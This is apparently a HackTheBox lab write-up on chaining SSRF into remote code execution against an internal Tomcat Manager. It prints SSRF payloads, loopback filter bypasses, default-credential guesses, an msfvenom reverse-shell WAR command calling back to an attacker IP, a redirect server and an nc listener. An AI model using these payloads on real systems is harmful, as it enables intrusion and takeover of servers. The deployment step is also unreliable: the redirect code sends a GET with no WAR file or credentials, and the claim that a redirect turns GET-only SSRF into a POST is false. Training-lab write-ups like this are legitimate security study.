HackTheBox: Exploiting SSRF
for Internal Recon

Jan 15, 2025 HackTheBox SSRF Web ~12 min read

Server-Side Request Forgery (SSRF) is one of those vulnerabilities that looks simple on paper but opens devastating attack paths when chained correctly. In this writeup, I walk through how I exploited an SSRF vulnerability on a HackTheBox machine to enumerate internal services, pivot into a restricted network segment, and ultimately achieve full compromise.

Reconnaissance

Starting with an Nmap scan to identify open ports and services:

Terminal
nmap -sC -sV -oN nmap_initial.txt 10.10.11.X

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    nginx 1.18.0
8080/tcp open  http    Apache Tomcat 9.0.41

The web application on port 80 was a document-fetching service — users could enter a URL and the server would retrieve and render the content. Classic SSRF setup. Port 8080 running Tomcat was interesting but not directly accessible from my IP.

Identifying the SSRF Entry Point

Navigating to the application revealed a "Fetch Document" feature with a URL input field. My first test was pointing it at my own server to confirm outbound requests:

Payload
http://10.10.14.5:8000/test
Python HTTP Server — Listener
python3 -m http.server 8000
# Got a hit:
# 10.10.11.X - - [15/Jan/2025] "GET /test HTTP/1.1" 200
ℹ Key Observation

The server made an outbound HTTP request from its own IP — confirming SSRF. Now the goal is to redirect that request toward internal resources.

Probing Internal Services

With SSRF confirmed, I started probing internal addresses. The 169.254.169.254 cloud metadata endpoint is always worth checking first:

Payload
http://169.254.169.254/latest/meta-data/

No luck — the machine wasn't on a cloud provider. I shifted to enumerating localhost services and common internal ports:

Port probing via SSRF
http://127.0.0.1:8080/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:5000/

The request to 127.0.0.1:8080 returned the Tomcat manager page — only accessible internally. The response included the full Tomcat Manager interface with a visible app list.

Bypassing Input Filters

The application had basic filtering — it blocked requests to 127.0.0.1 directly. I used several bypass techniques:

  • Decimal IP: http://2130706433:8080/ (127.0.0.1 in decimal)
  • Octal IP: http://0177.0.0.1:8080/
  • IPv6 loopback: http://[::1]:8080/
  • DNS rebinding: http://localtest.me:8080/
⚠ Filter Bypass

The IPv6 loopback [::1] worked. The filter only checked for the string "127.0.0.1" — a classic denylisting failure.

Accessing the Tomcat Manager

With access to the internal Tomcat Manager via SSRF, I could see deployed applications and attempt to deploy a malicious WAR file. Tomcat Manager default credentials are often left unchanged:

Common default creds tried
admin:admin
tomcat:tomcat
admin:s3cret
tomcat:s3cret   ✓ SUCCESS

Authenticated! Now I generated a reverse shell WAR file using msfvenom:

Generating the WAR shell
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  -f war -o shell.war

Deploying the Shell via SSRF

Deploying a WAR via Tomcat Manager requires a POST request with multipart form data. I crafted this as a SSRF payload through the document fetcher, using a redirect chain:

Redirect server (redirect.py)
from http.server import BaseHTTPRequestHandler, HTTPServer

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location',
          'http://[::1]:8080/manager/text/deploy'
          '?path=/shell&update=true')
        self.end_headers()

HTTPServer(('0.0.0.0', 8888), Redirect).serve_forever()

Getting a Shell

Shell obtained
nc -lvnp 4444
# Connection received on 10.10.11.X 54312
# id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
✓ Initial Access Achieved

Running as the tomcat service user. From here, privilege escalation to root involved a SUID binary — but that's a story for another writeup.

Key Takeaways

  • Always test SSRF against internal ports, not just external OOB callbacks
  • Denylist-based filters are weak — IPv6, decimal, and octal encodings almost always bypass them
  • Chain vulnerabilities: SSRF → internal service access → credential reuse → RCE
  • Cloud metadata endpoints and Tomcat/Spring actuators are highest-value internal targets
  • Redirect chains allow turning GET-only SSRF into POST requests
